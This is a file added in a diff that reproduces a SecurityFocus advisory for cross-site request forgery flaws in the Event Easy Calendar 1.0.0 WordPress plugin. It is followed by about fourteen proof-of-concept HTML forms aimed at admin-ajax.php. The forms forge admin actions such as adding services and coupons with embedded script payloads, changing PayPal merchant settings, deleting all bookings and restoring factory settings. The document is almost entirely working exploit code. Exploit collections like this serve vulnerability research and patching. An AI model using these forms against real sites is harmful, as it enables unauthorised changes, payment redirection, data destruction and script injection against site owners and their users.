@@ -1,0 +1,202 @@
+source: http://www.securityfocus.com/bid/62269/info
+
+The Event Easy Calendar plugin for WordPress is prone to multiple cross-site request-forgery vulnerabilities.
+
+Exploiting these issues may allow a remote attacker to perform certain unauthorized actions in the context of the affected application. Other attacks are also possible.
+
+Event Easy Calendar 1.0.0 is vulnerable; other versions may also be affected. 
+
+
+f of Concept
+========================
+Add Customer
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="data-table_length" value="10">
+    <input type="hidden" name="radioservice" value="1">
+    <input type="hidden" name="hdServiceTypeDDL" value="">  
+    <input type="hidden" name="uxTxtControl1" value="new () user com">
+    <input type="hidden" name="uxTxtControl2" value="<script>alert(1)</script>">
+    <input type="hidden" name="hiddeninputname" value="">   
+    <input type="hidden" name="hiddeninputname" value="">   
+    <input type="hidden" name="uxHdnTotalCost" value="0.00">
+    <input type="hidden" name="param" value="addNewCustomer">
+    <input type="hidden" name="action" value="bookingsLibrary">
+    <input type="submit" value="Add Customer">
+</form>
+
+Update Customer
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="data-table_length" value="10">
+    <input type="hidden" name="radioservice" value="2">
+    <input type="hidden" name="hdServiceTypeDDL" value="">  
+    <input type="hidden" name="uxTxtControl1" value="new () user com">
+    <input type="hidden" name="uxTxtControl2" value="NewUser">
+    <input type="hidden" name="hiddeninputname" value="">   
+    <input type="hidden" name="hiddeninputname" value="">   
+    <input type="hidden" name="uxHdnTotalCost" value="100.00">
+    <input type="hidden" name="customerId" value="3">
+    <input type="hidden" name="uxCustomerEmail" value="new () user com">
+    <input type="hidden" name="param" value="upDateCustomer">
+    <input type="hidden" name="action" value="bookingsLibrary">
+    <input type="submit" value="Update Customer">
+</form>
+
+New Booking
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="altField" value="2013-08-15">
+    <input type="hidden" name="serviceId" value="2">
+    <input type="hidden" name="customerId" value="5">
+    <input type="hidden" name="uxCouponCode" value="">  
+    <input type="hidden" name="uxNotes" value="">   
+    <input type="hidden" name="bookingTime" value="900">
+    <input type="hidden" name="param" value="frontEndMutipleDates">
+    <input type="hidden" name="action" value="bookingsLibrary">
+    <input type="submit" value="New Booking">
+</form>
+
+Add Service
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="uxServiceColor" value="#00ff00">
+    <input type="text" name="uxServiceName" value="CSRF service<script>alert(1)</script>">
+    <input type="hidden" name="uxServiceCost" value="0">
+    <input type="hidden" name="uxServiceType" value="0">
+    <input type="hidden" name="uxMaxBookings" value="1">
+    <input type="hidden" name="uxFullDayService" value="">
+    <input type="hidden" name="uxMaxDays" value="1">
+    <input type="hidden" name="uxCostType" value="0">
+    <input type="hidden" name="uxServiceHours" value="00">
+    <input type="hidden" name="uxServiceMins" value="30">
+    <input type="hidden" name="uxStartTimeHours" value="9">
+    <input type="hidden" name="uxStartTimeMins" value="0">
+    <input type="hidden" name="uxStartTimeAMPM" value="AM">
+    <input type="hidden" name="uxEndTimeHours" value="5">
+    <input type="hidden" name="uxEndTimeMins" value="0">
+    <input type="hidden" name="uxEndTimeAMPM" value="PM">
+    <input type="hidden" name="param" value="addService">
+    <input type="hidden" name="action" value="dashboardLibrary">
+    <input type="submit" value="Add Service">
+</form>
+
+Add Block Out
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="uxExceptionsServices" value="4">
+    <input type="hidden" name="uxExceptionsIntervals" value="1">
+    <input type="hidden" name="uxExceptionsRepeatDay" value="1">
+    <input type="hidden" name="uxExceptionsStartsOn" value="">
+    <input type="hidden" name="uxExceptionsStartTimeHours" value="09">
+    <input type="hidden" name="uxExceptionsStartTimeMins" value="00">
+    <input type="hidden" name="uxExceptionsStartTimeAMPM" value="AM">
+    <input type="hidden" name="uxExceptionsEndTimeHours" value="05">
+    <input type="hidden" name="uxExceptionsEndTimeMins" value="00">
+    <input type="hidden" name="uxExceptionsEndTimeAMPM" value="PM">
+    <input type="hidden" name="uxExceptionsDay" value="0">
+    <input type="hidden" name="uxExceptionsDayEndsOn" value="">
+    <input type="hidden" name="uxExceptionsWeekDay1" value="Sun">
+    <input type="hidden" name="uxExceptionsWeekDay2" value="Wed">
+    <input type="hidden" name="uxExceptionsRepeatWeeks" value="9">
+    <input type="hidden" name="uxExceptionsWeekStartsOn" value="2013-08-22">
+    <input type="hidden" name="uxExceptionsWeekStartTimeHours" value="09">
+    <input type="hidden" name="uxExceptionsWeekStartTimeMins" value="00">
+    <input type="hidden" name="uxExceptionsWeekStartTimeAMPM" value="AM">
+    <input type="hidden" name="uxExceptionsWeekEndTimeHours" value="05">
+    <input type="hidden" name="uxExceptionsWeekEndTimeMins" value="00">
+    <input type="hidden" name="uxExceptionsWeekEndTimeAMPM" value="PM">
+    <input type="hidden" name="uxExceptionsWeek" value="0">
+    <input type="hidden" name="uxExceptionsWeekEndsOn" value="">
+    <input type="hidden" name="param" value="insertExceptionWeeks">
+    <input type="hidden" name="action" value="dashboardLibrary">
+    <input type="submit" value="Add Block Out">
+</form>
+
+Add Cupon
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="uxDefaultCoupon" value="XSS<script>alert('xss')</script>">
+    <input type="hidden" name="uxValidFrom" value="2013-08-15">
+    <input type="hidden" name="uxValidUpto" value="2013-08-22">
+    <input type="hidden" name="uxAmount" value="50">
+    <input type="hidden" name="uxDdlAmountType" value="1">
+    <input type="hidden" name="uxApplicableOnAllProducts" value="1">
+    <input type="hidden" name="uxDdlBookingServices" value="4">
+    <input type="hidden" name="param" value="addCoupons">
+    <input type="hidden" name="action" value="dashboardLibrary">
+    <input type="submit" value="Add Cupon">
+</form>
+
+Default Settings
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="uxDdlDefaultCurrency" value="United States Dollar">
+    <input type="hidden" name="uxDdlDefaultCountry" value="United States of America">
+    <input type="hidden" name="uxDefaultDateFormat" value="0">
+    <input type="hidden" name="uxDefaultTimeFormat" value="0">
+    <input type="hidden" name="uxDefaultTimeZone" value="-5.0">
+    <input type="hidden" name="uxServiceDisplayFormat" value="0">
+    <input type="hidden" name="param" value="updateGeneralSettings">
+    <input type="hidden" name="action" value="dashboardLibrary">
+    <input type="submit" value="Default Settings">
+</form>
+
+Reminder Settings
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="uxReminderSettings" value="1">
+    <input type="hidden" name="uxReminderInterval" value="1 hour">
+    <input type="hidden" name="param" value="UpdateReminderSettings">
+    <input type="hidden" name="action" value="dashboardLibrary">
+    <input type="submit" value="Reminder Settings">
+</form>
+
+PayPal Settings
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    Email: <input type="text" name="uxMerchantEmailAddress" placeholder="enter your PayPal email here">
+    <input type="hidden" name="uxPayPal" value="1">
+    <input type="hidden" name="uxPayPalUrl" value="https://paypal.com/cgi-bin/webscr";>
+    <input type="hidden" name="uxThankyouPageUrl" value="http://google.com";>
+    <input type="hidden" name="uxCancellationUrl" value="http://google.com";>
+    <input type="hidden" name="param" value="UpdatePaymentGateway">
+    <input type="hidden" name="action" value="dashboardLibrary">
+    <input type="submit" value="PayPal Settings">
+</form>
+
+Mailchimp Settings
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="uxMailChimp" value="1">
+    <input type="hidden" name="uxMailChimpApiKey" value="12345678">
+    <input type="hidden" name="uxMailChimpUniqueId" value="87654321">
+    <input type="hidden" name="uxDoubleOptIn" value="false">
+    <input type="hidden" name="uxWelcomeEmail" value="false">
+    <input type="hidden" name="param" value="UpdateAutoResponder">
+    <input type="hidden" name="action" value="dashboardLibrary">
+    <input type="submit" value="Mailchimp Settings">
+</form>
+
+Facebook Connect
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="uxFacebookConnect" value="1">
+    <input type="hidden" name="uxFacebookAppId" value="12345678">
+    <input type="hidden" name="uxFacebookSecretKey" value="87654321">
+    <input type="hidden" name="param" value="UpdateFacebookSocialMedia">
+    <input type="hidden" name="action" value="dashboardLibrary">
+    <input type="submit" value="Facebook Connect">
+</form>
+
+Auto Approve
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="uxAutoApprove" value="1">
+    <input type="hidden" name="param" value="AutoApprove">
+    <input type="hidden" name="action" value="dashboardLibrary">
+    <input type="submit" value="Auto Approve">
+</form>
+
+Delete All Bookings
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="param" value="DeleteAllBookings">
+    <input type="hidden" name="action" value="dashboardLibrary">
+    <input type="submit" value="Delete All Bookings">
+</form>
+
+Restore Factory Settings
+<form method="post" action="http://www.example.com/wp-admin/admin-ajax.php";>
+    <input type="hidden" name="param" value="RestoreFactorySettings">
+    <input type="hidden" name="action" value="dashboardLibrary">
+    <input type="submit" value="Restore Factory Settings">
+</form>
+
